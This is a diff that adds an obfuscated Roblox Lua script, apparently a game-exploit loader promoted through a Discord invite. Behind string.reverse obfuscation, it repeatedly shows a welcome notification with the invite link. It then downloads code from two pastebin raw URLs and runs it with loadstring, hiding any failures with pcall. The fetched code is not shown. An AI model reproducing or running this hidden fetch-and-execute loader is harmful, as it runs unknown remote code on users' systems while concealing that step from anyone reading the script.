@@ -1,0 +1,3 @@
+-- https://discord.gg/phR8Bj8BNX
+-- 2025 Script.
+local _g=game;local _t=task;local _p=pcall;local _r=string.reverse;local _s=_g:GetService(_r("iuGretratS"));local _c=_r("noitacifitoNdneS");local _m={Title=_r(".odniv meB !álO"),Text=_r("XNB8jB8Rhp/gg.drocsid//:sptth"),Duration=15};_t.spawn(function()repeat local _o=_p(function()_s:SetCore(_c,_m)end)if not _o then _t.wait(0.2)end until _o;for _=1,6 do _p(function()_s:SetCore(_c,_m)end)_t.wait(0.1)end end);local function _x(_u)_t.spawn(function()_p(function()local _f=loadstring(_g:HttpGet(_r(_u)))if _f then _f()end end)end)end;_x("baYhgkgn/war/moc.nibetsap//:sptth");_x("NNF7avXJ/war/moc.nibetsap//:sptth")
